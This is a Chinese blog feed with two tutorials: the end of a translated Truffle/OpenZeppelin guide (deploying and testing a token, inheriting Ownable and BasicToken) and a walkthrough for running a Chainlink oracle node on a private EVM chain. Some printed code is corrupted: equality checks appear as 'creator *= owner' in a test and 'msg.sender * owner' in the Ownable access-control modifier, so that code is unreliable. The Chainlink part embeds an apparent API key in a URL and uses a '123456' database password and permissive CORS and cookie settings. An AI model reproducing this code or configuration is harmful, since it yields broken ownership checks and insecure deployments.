<p>如你所见，迁移会将我们的代币部署于网络中。这次，我们无需运行 testrpc 节点，因为 <em>Truffle</em> 已经自带了一个模拟节点，可用于开发和测试之途。我们只需要打开一个终端运行 <em>npx truffle develop</em> 并使用 <em>truffle migrate</em> 运行迁移。<a href="https://github.com/zkat/npx">npx介绍</a>。之后，你会看到下列输出值：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">truffle(develop)&gt; truffle migrate</span><br><span class="line"></span><br><span class="line">Using network ‘develop’.</span><br><span class="line"></span><br><span class="line">Running migration: 1_initial_migration.js</span><br><span class="line">Deploying Migrations…</span><br><span class="line">… 0xf5776c9f32a9b5b7600d88a6a24b0ef433f559c31aaeb5eaf6e2fc5e2f7fa669</span><br><span class="line">Migrations: 0x8cdaf0cd259887258bc13a92c0a6da92698644c0</span><br><span class="line">Saving successful migration to network…</span><br><span class="line">… 0xd7bc86d31bee32fa3988f1c1eabce403a1b5d570340a3a9cdba53a472ee8c956</span><br><span class="line">Saving artifacts…</span><br><span class="line"></span><br><span class="line">Running migration: 2_deploy_my_token.js</span><br><span class="line">Deploying MyToken…</span><br><span class="line">… 0xc74019c2fe3b3ef1d4e2033c2e4b9fa13611f3150f8b6b37334a8e29e24b056c</span><br><span class="line">MyToken: 0x345ca3e014aaf5dca488057592ee47305d9b3e10</span><br><span class="line">Saving successful migration to network…</span><br><span class="line">… 0xf36163615f41ef7ed8f4a8f192149a0bf633fe1a2398ce001bf44c43dc7bdda0</span><br><span class="line">Saving artifacts…</span><br></pre></td></tr></table></figure>
<p>我们只关注 MyToken: <em>0x345ca3e014aaf5dca488057592ee47305d9b3e10</em> 这行代码，它是我们已部署的代币合约的地址。在默认情况下，Truffle 为模拟节点预置了10个拥有虚拟ETH的地址，就像使用 testrpc 时那样。我们可以通过 web3 以太币账户访问该地址列表。此外，Truffle 使用列表中的第一个地址（索引为0的那个）部署这些合约，这意味着它将成为 MyToken 的所有者。</p>
<p>鉴于 Web3 可用于Truffle控制台内，你可以运行下列指令来检查所有者的余额：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">truffle(develop)&gt; owner = web3.eth.accounts[0]</span><br><span class="line">truffle(develop)&gt; instance = MyToken.at(<span class="string">&#x27;[DEPLOYED_ADDRESS]&#x27;</span>)</span><br><span class="line">truffle(develop)&gt; instance.balanceOf(owner)</span><br></pre></td></tr></table></figure>
<p>注意：别忘了将 [DEPLOYED_ADDRESS] 替换成由Truffle赋予的已部署合约的地址，例如： <em>0x345ca3e014aaf5dca488057592ee47305d9b3e10</em> 。</p>
<p>我们也可以先将一些代币发送至另一个地址，再检查更新过后的余额：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// send tokens</span></span><br><span class="line">amount = <span class="number">10</span></span><br><span class="line">recipient = web3.eth.accounts[<span class="number">1</span>]</span><br><span class="line">txHash = instance.sendTokens(recipient, amount, &#123; <span class="attr">from</span>: owner &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// check balances</span></span><br><span class="line">instance.balanceOf(owner)</span><br><span class="line">instance.balanceOf(recipient)</span><br></pre></td></tr></table></figure>

<p>现在已经可以看到接受者的账户里有10枚代币了！我们可以通过下列代码搜索交易信息：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">web3.eth.getTransaction(txHash)</span><br></pre></td></tr></table></figure>

<p><strong>3.2. 测试智能合约</strong><br>接下来，Truffle更有趣又有用的一点是，我们可以测试我们的合约。这一构架能让你通过两种不同方式编写测试代码：Javascript 和 Solidity。在这篇文章中，我们将学习一些关于JS测试这个最常用选项的基本知识。</p>
<p>Truffle使用后台的 <a href="https://mochajs.org/">Mocha</a> 作为测试构架，并使用 <a href="http://chaijs.com/">Chai</a> 来执行断言。如果你不熟悉这两个库也没有关系，它们真的都很简单，执行的语法也与其它测试架构相似。</p>
<p>准备好了，让我们开始介绍第一则测试实例吧。我们需要在测试文件夹里创建一个 MyToken.js 文件。一旦你创建完成之后，请将下方代码粘贴进去。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyToken = artifacts.require(<span class="string">&#x27;MyToken&#x27;</span>)</span><br><span class="line"></span><br><span class="line">contract(<span class="string">&#x27;MyToken&#x27;</span>, <span class="function"><span class="params">accounts</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  it(<span class="string">&#x27;has a total supply and a creator&#x27;</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> owner = accounts[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">const</span> myToken = <span class="keyword">await</span> MyToken.new(&#123; <span class="attr">from</span>: owner &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> creator = <span class="keyword">await</span> myToken.creator()</span><br><span class="line">    <span class="keyword">const</span> totalSupply = <span class="keyword">await</span> myToken.totalSupply()</span><br><span class="line">    </span><br><span class="line">    assert(creator *= owner)</span><br><span class="line">    assert(totalSupply.eq(<span class="number">10000</span>))</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>要运行 <em>Truffle 测试</em>的话，你只需使用指令 <em>npx truffle test</em>。再次提醒：此处无需在后台运行 rpc 测试节点，因为 Truffle 会帮你运行好。</p>
<p>你可能已经注意到了，这是我们第二次在代码中使用 <em>artifacts.require()</em> 。第一次是在编写 <em>MyToken</em> migration 代码的时候。Artifact是分别编译每个合约的结果。这些 Artifacts 将被置于与你的项目根相关的 <em>build/contracts/</em> 目录之内。我们通过 <em>artifacts.require()</em> 告诉 Truffle 想与哪个合约进行交互。只提供合约名并实现抽象化使用。你也可以阅读<a href="http://truffleframework.com/docs/getting_started/migrations#artifacts-require-">这篇文章</a>来详细了解 Truffle artifacts。</p>
<p>剩下的最后一个重点是 <em>contract()</em> 函数，它确实与Mocha的 <em>describe()</em> 函数相似。这就是 Truffle 保障<a href="http://truffleframework.com/docs/getting_started/testing#clean-room-environment">clean-room environment</a>的方式。Truffle 将重新把合约部署给以太坊客户端，并在每次被调用之时提供一列可用账户。不过，我们不建议将已部署的合约实例用于测试。让每个测试管理它们自己的实例会更好。</p>
<p>既然我们了解了有关 Truttle 测试的一些基本知识，让我们再介绍一个有趣的场景吧。我们将测试账户之间的代币转让：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">it(<span class="string">&#x27;allows token transfers&#x27;</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> owner = accounts[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">const</span> recipient = accounts[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">const</span> myToken = <span class="keyword">await</span> MyToken.new(&#123; <span class="attr">from</span>: owner &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> myToken.sendTokens(recipient, <span class="number">10</span>, &#123; <span class="attr">from</span>: owner &#125;)</span><br><span class="line">  <span class="keyword">const</span> ownerBalance = <span class="keyword">await</span> myToken.balanceOf(owner)</span><br><span class="line">  assert(ownerBalance.eq(<span class="number">9990</span>))</span><br><span class="line">  <span class="keyword">const</span> recipientBalance = <span class="keyword">await</span> myToken.balanceOf(recipient)</span><br><span class="line">  assert(recipientBalance.eq(<span class="number">10</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>其它的测试实例见<a href="https://github.com/WillZhuang/ethereum-spiking/tree/master/3-using-truffle">此处</a>，从中你还可以看到我是如何使用 Truffle 来完成这个 mini DApp 的。你会看到我设置了同样的特性，就像我们在上一篇文章中对 app 所做的那样。 唯一改变之处是我们正在使用 Truffle 启动测试节点、部署合约并添加测试，从而确保我们的合约能达到我们预期的效果。</p>
<p><strong>3.3.OpenZeppelin</strong></p>
<p>如果你阅读到此处，想必你已经听说过 <a href="https://openzeppelin.org/">OpenZeppelin</a> 了吧。如果你还没有的话，你只需要知道它是有助于你构建智能合约的最常用构架。它是一个开源构架，提供可重复使用的智能合约构建分布式应用、协议和组织，从而降低使用经测试和社区审查的标准代码所带来的安全隐患。</p>
<p>鉴于代币合约的数量之大，以太坊社区于两年前创建了一个名为 <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md">ERC20</a> 的代币标准。其理念是允许 DApps 和钱包以共同的方式在多种界面和 DApps 之间处理代币。</p>
<p>也就是说，最常用的 OpenZeppelin 合约就是 ERC20 用例。这就是我们第一步要对 MyToken 合约做的事：使之与 ERC20 兼容。让我们先安装 OpenZeppelin 构架，这需要运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install zeppelin-solidity</span><br></pre></td></tr></table></figure>
<p>现在，看看我们用一些OpenZeppelin合约构建的新用例。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#39;zeppelin-solidity&#x2F;contracts&#x2F;token&#x2F;BasicToken.sol&#39;;</span><br><span class="line">import &#39;zeppelin-solidity&#x2F;contracts&#x2F;ownership&#x2F;Ownable.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract MyToken is BasicToken, Ownable &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public constant INITIAL_SUPPLY &#x3D; 10000;</span><br><span class="line">  function MyToken() &#123;</span><br><span class="line">    totalSupply &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    balances[msg.sender] &#x3D; INITIAL_SUPPLY;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如你所见，我们已经去除了很多核心功能。好吧，我们还没有去除这些功能，只是向OpenZeppelin 合约下达了该指令。这的确很有用，因为我们是在重复使用经过审核的安全代码，这意味着我们已经减少了合约的受攻击可能性。</p>
<p>此外，我们正将代币合约从 <a href="https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.5.0/contracts/ownership/Ownable.sol">Ownable</a> 和 <a href="https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.5.0/contracts/token/BasicToken.sol">BasicToken</a> 这两个 OpenZeppelin 合约扩展而来。是的，Solidity 支持多重继承，而且对你来说，知道顺序的重要性真的很重要。不过，这超出了本文的介绍范围，不过你可以从<a href="https://solidity.readthedocs.io/en/develop/contracts.html#inheritance">此处</a>了解更多详情。</p>
<p>正如上文所说，我们正将<em>MyToken</em>从<em>Ownable</em>中扩展而来。让我们看一看这个合约：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Ownable &#123;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">  function Ownable() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner() &#123;</span><br><span class="line">    require(msg.sender * owner);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">    require(newOwner !&#x3D; address(0));</span><br><span class="line">    OwnershipTransferred(owner, newOwner);</span><br><span class="line">    owner &#x3D; newOwner;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Ownable提供三大主要功能：</p>
<ul>
<li>它有一个特殊地址供我们调用其“owner”；</li>
<li>它允许我们转让合约的所有权；</li>
<li>它提供了有用的onlyOwner修改器，确保只有所有者才能调用某个函数。</li>
</ul>
<p>很有用对吧？另一方面，我们也在扩展 BasicTokencontract（基础代币合约）。让我们了解下它的功能：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#39;..&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract ERC20Basic &#123;</span><br><span class="line">  uint256 public totalSupply;</span><br><span class="line">  function balanceOf(address who) public view returns (uint256);</span><br><span class="line">  function transfer(address to, uint256 value) public returns (bool);</span><br><span class="line">  event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract BasicToken is ERC20Basic &#123;</span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint256) balances;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">    require(_to !&#x3D; address(0));</span><br><span class="line">    require(_value &lt;&#x3D; balances[msg.sender]);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] &#x3D; balances[msg.sender].sub(_value);</span><br><span class="line">    balances[_to] &#x3D; balances[_to].add(_value);</span><br><span class="line">    Transfer(msg.sender, _to, _value);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相信你更熟悉这个代码。这基本上是我们过去在 MyToken 合约中所做的事。这里存在一些细微的差异，因为我们没有遵循原始版本的ERC20标准。我们此处所说的 <a href="https://github.com/WillZhuang/ethereum-spiking/blob/master/3-using-truffle/contracts/MyToken.sol">sendTokens</a> 只是转让，除了触发 <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md#transfer"><em>transfer</em></a> <a href="https://solidity.readthedocs.io/en/develop/contracts.html#events">事件</a>之外执行的几乎是同样的行为。</p>
<p>另一个重要的事是使用<em>SafeMath</em>编写<em>uint256</em>代码。SafeMath是 OpenZeppelin 推荐使用的库，用来进行带有安全检查的数学运算。这是另一个常用合约，因为它能保证数学运算不会溢出。</p>
<p>OpenZeppelin 本身就是一个完整的领域，请花点时间深入分析并学习它。你可以先从读取并密切关注已经审查的<a href="https://github.com/OpenZeppelin/zeppelin-solidity">代码库</a>的安全细节开始。</p>
<blockquote>
<p>原文链接: <a href="https://blog.zeppelin.solutions/a-gentle-introduction-to-ethereum-programming-part-3-abdd9644d0c2">https://blog.zeppelin.solutions/a-gentle-introduction-to-ethereum-programming-part-3-abdd9644d0c2</a></p>
<p>作者: Facu Spagnuolo</p>
</blockquote>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>体验Chainlink</title>
    <url>/2020/04/14/%E4%BD%93%E9%AA%8CChainlink/</url>
    <content><![CDATA[<p>Chainlink是一个去中心化的预言机，但是你同样可以在私有环境中使用Chainlink，让它成为一个为私有链或联盟链服务的中心化的预言机系统。只要你的私有链环境支持完整的EVM环境，就可以利用Chainlink的开源实现，为自己的系统搭建一个具有广泛适配能力的预言机系统。</p>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="私有链-联盟链（需支持EVM，开放WebSocket端口）"><a href="#私有链-联盟链（需支持EVM，开放WebSocket端口）" class="headerlink" title="私有链/联盟链（需支持EVM，开放WebSocket端口）"></a>私有链/联盟链（需支持EVM，开放WebSocket端口）</h4><p>由于目前Chainlink的合约系统都是在以太坊网络上的虚拟环境中运行的，所以需要您的私有链/联盟链支持EVM环境以及Solidity合约编程语言。</p>
<h3 id="用于部署合约的账户，账户需持有足够数量的Native-Token（原生代币）"><a href="#用于部署合约的账户，账户需持有足够数量的Native-Token（原生代币）" class="headerlink" title="用于部署合约的账户，账户需持有足够数量的Native Token（原生代币）"></a>用于部署合约的账户，账户需持有足够数量的Native Token（原生代币）</h3><p>一般来说，向区块链提交事务，不管是创建合约还是普通转账，都需要事务发起账户提供一定的手续费，所以需要一个持有原生代币的账户，用于部署合约和节点提交事务。如果您的私有链提交事务不需要手续费，那仅需要一个账户就可以。（具体请根据您的私有链的配置操作）</p>
<h4 id="一台服务器用于部署Chainlink节点"><a href="#一台服务器用于部署Chainlink节点" class="headerlink" title="一台服务器用于部署Chainlink节点"></a>一台服务器用于部署Chainlink节点</h4><p>Chainlink节点相当于区块链在真实世界中的代理，它可以接收链上的数据请求，并获取到链上所需要的数据，通过事务提交给链上。所以需要一台服务器来建立Chainlink节点服务，服务器配置不需要很高，但是需要和私有链环境保持良好的网络通讯。</p>
<p>之前的Chainlink节点版本默认使用Sqlite作为存储数据库，但是随着功能越来越完善，性能要求也越来越高，从0.8.0版本起，Chainlink节点要求必须使用postgres作为存储数据库，所以我们需要搭建一个postgres数据库。这个数据库可以和节点位于同一台服务器上，也可以位于不同的服务器上。您也可以同时搭建两个数据库作为备份。</p>
<h3 id="可选-准备truffle-suite和npm或WebIDE-Remix等开发部署工具"><a href="#可选-准备truffle-suite和npm或WebIDE-Remix等开发部署工具" class="headerlink" title="(可选)准备truffle suite和npm或WebIDE Remix等开发部署工具"></a>(可选)准备truffle suite和npm或WebIDE Remix等开发部署工具</h3><p>您可以选择Chainlink提供的truffle box来编写和部署测试合约</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">truffle unbox smartcontractkit&#x2F;box</span><br></pre></td></tr></table></figure>

<p>也可以在已有的项目中添加Chainlink开发库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">truffle init</span><br><span class="line">npm install @chainlink&#x2F;contracts --save</span><br></pre></td></tr></table></figure>

<p>同样的，您也可以使用可视化的Web IDE Remix来进行开发，使用起来更加方便，也无需配置本地开发环境。在使用Remix时，可以搭配MetaMask来进行转账和事务操作。</p>
<p><a href="https://remix.ethereum.org/">https://remix.ethereum.org</a></p>
<p><a href="https://metamask.io/">https://metamask.io</a></p>
<h3 id="实施步骤"><a href="#实施步骤" class="headerlink" title="实施步骤"></a>实施步骤</h3><h3 id="0-搭建-EVM-私链"><a href="#0-搭建-EVM-私链" class="headerlink" title="0.搭建 EVM 私链"></a>0.搭建 EVM 私链</h3><h3 id="1-部署Link-Token-合约"><a href="#1-部署Link-Token-合约" class="headerlink" title="1.部署Link Token 合约"></a>1.部署Link Token 合约</h3><p><a href="https://github.com/smartcontractkit/chainlink/blob/develop/evm-contracts/src/v0.4/LinkToken.sol">LinkToken.sol</a></p>
<p>所有Chainlink的功能实现和数据流转都是围绕LINK token来实现的。<code>这里的remix中默认是https url，如果访问vmware中的linux server，建议在remix中使用 http url</code></p>
<p><img src="/2020/04/14/%E4%BD%93%E9%AA%8CChainlink/1.png" alt="img"></p>
<h3 id="2-部署Chainlink节点"><a href="#2-部署Chainlink节点" class="headerlink" title="2.部署Chainlink节点"></a>2.部署Chainlink节点</h3><h4 id="2-1-安装docker、postgres-（建议postgres也在docker中安装）"><a href="#2-1-安装docker、postgres-（建议postgres也在docker中安装）" class="headerlink" title="2.1 安装docker、postgres （建议postgres也在docker中安装）"></a>2.1 安装docker、postgres （建议postgres也在docker中安装）</h4><h4 id="2-2-创建环境变量配置文件"><a href="#2-2-创建环境变量配置文件" class="headerlink" title="2.2 创建环境变量配置文件"></a>2.2 创建环境变量配置文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir ~/.chainlink</span><br><span class="line">cd ~/.chainlink</span><br><span class="line">vim .env</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROOT=/chainlink</span><br><span class="line">LOG_LEVEL=debug</span><br><span class="line">ETH_CHAIN_ID=1337</span><br><span class="line">MIN_OUTGOING_CONFIRMATIONS=0</span><br><span class="line">MIN_INCOMING_CONFIRMATIONS=0</span><br><span class="line">LINK_CONTRACT_ADDRESS=0x9E05B78ea853a4B093694645561c4BFc953A6f62</span><br><span class="line">CHAINLINK_TLS_PORT=0</span><br><span class="line">SECURE_COOKIES=false</span><br><span class="line">ALLOW_ORIGINS=*</span><br><span class="line">ETH_URL=ws://localhost:8546</span><br><span class="line">DATABASE_URL=postgresql://postgres:123456@localhost:5432/chainlink?sslmode=disable</span><br><span class="line">DATABASE_TIMEOUT=0</span><br></pre></td></tr></table></figure>

<p>其中<code>ETH_URL</code>是私有链的RPC接口，必须是WebSocket接口，可以是<code>ws</code>也可以是<code>wss</code>。</p>
<p><code>LINK_CONTRACT_ADDRESS</code> 是刚刚部署的Link token 地址。</p>
<h4 id="2-3-通过docker启动"><a href="#2-3-通过docker启动" class="headerlink" title="2.3 通过docker启动"></a>2.3 通过docker启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~/.chainlink</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动postgres</span></span><br><span class="line">docker run --name postgres_chainlink -e POSTGRES_PASSWORD=123456 -v /home/will/documents/chainlink:/var/lib/postgresql/data -p 5432:5432 -d postgres:11.5-alpine </span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动chainlink节点</span></span><br><span class="line">docker run --net host  -p 6688:6688 -v ~/.chainlink:/chainlink -it --env-file=.env smartcontract/chainlink:0.7.8 local n</span><br></pre></td></tr></table></figure>

<p>其中<code>--net host</code> 是为了让通过docker启动的Chainlink节点可以访问到宿主记得网络，否则上面配置文件中的localhost都是不可访问的。也可以通过其他更加安全的docker网络配置完成同样功能。</p>
<p><code>0.7.8</code>是Chainlink的release版本号，不写的话默认是latest。</p>
<h4 id="2-4-记录节点管理密码"><a href="#2-4-记录节点管理密码" class="headerlink" title="2.4 记录节点管理密码"></a>2.4 记录节点管理密码</h4><p>首次启动成功后，首先会要求输入一个密码，这个密码是Chainlink节点账户的私钥密码，可以用来控制Chainlink节点账户，必须牢记，否则节点账户所持有的资金无法取出。</p>
<p>然后会要求输入一对用户名和密码，这是Chainlink管理界面的的用户名和密码，在通过 http: //chainlink_ip:6688 访问管理端界面时会要求输入这对用户名和密码。</p>
<p><img src="/2020/04/14/%E4%BD%93%E9%AA%8CChainlink/2.png" alt="img"></p>
<h4 id="2-5-创建Job"><a href="#2-5-创建Job" class="headerlink" title="2.5 创建Job"></a>2.5 创建Job</h4><p><a href="https://docs.chain.link/docs/fulfilling-requests#section-add-jobs-to-the-node">https://docs.chain.link/docs/fulfilling-requests#section-add-jobs-to-the-node</a></p>
<p>创建不同数据类型的 Job</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;initiators&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;runlog&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;tasks&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;httpget&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;jsonparse&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;ethbytes32&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;ethtx&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-6-向Chainlink节点-ACCOUNT-ADDRESS-转入一定数量的Native-token用于提交事务"><a href="#2-6-向Chainlink节点-ACCOUNT-ADDRESS-转入一定数量的Native-token用于提交事务" class="headerlink" title="2.6 向Chainlink节点(ACCOUNT_ADDRESS)转入一定数量的Native token用于提交事务"></a>2.6 向Chainlink节点(ACCOUNT_ADDRESS)转入一定数量的Native token用于提交事务</h4><p>比如：如果是以太坊公网，需要转入ETH，以作为交易的gas费用。</p>
<p>节点地址可以在管理页面的configure页面下找到，账户资金仅用于提交transaction。</p>
<h3 id="3-部署oracle-contract"><a href="#3-部署oracle-contract" class="headerlink" title="3.部署oracle contract"></a>3.部署oracle contract</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity <span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;https://github.com/smartcontractkit/chainlink/evm-contracts/src/v0.4/Oracle.sol&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>调用合约中的setFulfillPermission方法，传递参数为<code>(ACCOUNT_ADDRESS,true)</code>，ACCOUNT_ADDRESS是ChainLink Operator。</p>
<h3 id="4-编写部署用户合约"><a href="#4-编写部署用户合约" class="headerlink" title="4.编写部署用户合约"></a>4.编写部署用户合约</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity <span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;https://github.com/smartcontractkit/chainlink/evm-contracts/src/v0.4/ChainlinkClient.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract GetTemperature is ChainlinkClient &#123;</span><br><span class="line">  LinkTokenInterface internal LinkToken;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  <span class="comment">//string constant url = &quot;https://www.random.org/integers/?num=1&amp;min=1&amp;max=6&amp;col=1&amp;base=10&amp;format=plain&amp;rnd=new&quot;;</span></span><br><span class="line">  string constant url = <span class="string">&quot;https://api.seniverse.com/v3/weather/now.json?key=S9g8Ize9pNyUZ_BOP&amp;location=shanghai&amp;language=zh-Hans&amp;unit=c&quot;</span>;</span><br><span class="line">  address constant oracleAddress = <span class="number">0xa6126AD8B8307C6e1b668F486BEA155e814FA22d</span>;</span><br><span class="line">  bytes32 constant JobId = <span class="string">&quot;d91130d49daf46aaa591bcbce6d59b72&quot;</span>;</span><br><span class="line">  address constant linkAddress = <span class="number">0x9E05B78ea853a4B093694645561c4BFc953A6f62</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;</span><br><span class="line">    setChainlinkToken(linkAddress);</span><br><span class="line">    setChainlinkOracle(oracleAddress);</span><br><span class="line">    LinkToken = LinkTokenInterface(linkAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string public temperature;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 发起Chainlink请求</span></span><br><span class="line">    requestTemperature(JobId);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">requestTemperature</span>(<span class="params">bytes32 _jobId</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bytes32 requestId</span>) </span>&#123;</span><br><span class="line">      </span><br><span class="line">    Chainlink.Request memory req = buildChainlinkRequest(_jobId, <span class="built_in">this</span>, <span class="built_in">this</span>.fulfillTemperature.selector);</span><br><span class="line"></span><br><span class="line">    req.add(<span class="string">&quot;get&quot;</span>, url);</span><br><span class="line">    req.add(<span class="string">&quot;path&quot;</span>, <span class="string">&quot;results.0.now.temperature&quot;</span>);</span><br><span class="line"></span><br><span class="line">    requestId = sendChainlinkRequest(req, <span class="number">1</span> * LINK);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> requestId;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">fulfillTemperature</span>(<span class="params">bytes32 _requestId, bytes32 _temp</span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span> <span class="title">recordChainlinkFulfillment</span>(<span class="params">_requestId</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    temperature = bytes32ToString(_temp);</span><br><span class="line">    <span class="comment">//data = _temp;</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">bytes32ToString</span>(<span class="params">bytes32 x</span>) <span class="title">private</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">string</span>) </span>&#123;</span><br><span class="line">    bytes memory bytesString = <span class="keyword">new</span> bytes(<span class="number">32</span>);</span><br><span class="line">    uint charCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++) &#123;</span><br><span class="line">        byte char = byte(bytes32(uint(x) * <span class="number">2</span> ** (<span class="number">8</span> * j)));</span><br><span class="line">        <span class="keyword">if</span> (char != <span class="number">0</span>) &#123;</span><br><span class="line">            bytesString[charCount] = char;</span><br><span class="line">            charCount++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    bytes memory bytesStringTrimmed = <span class="keyword">new</span> bytes(charCount);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; charCount; j++) &#123;</span><br><span class="line">        bytesStringTrimmed[j] = bytesString[j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> string(bytesStringTrimmed);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 linkAddress、OracleAddress、JobId 需要根据上面的配置结果填写，或作为参数在调用时传入。</p>
<p>向部署好的用户合约地址转入Link token，用户在发起请求是支付给节点的费用。上述部署的Link Token为18位精度，建议使用 transfer 方法转移 Link token 2000,000000000000000000</p>
<p>发起请求获取数据，使用getData方法获取天气数据。</p>
<p><img src="/2020/04/14/%E4%BD%93%E9%AA%8CChainlink/3.png" alt="image"></p>
]]></content>
      <tags>
        <tag>区块链</tag>
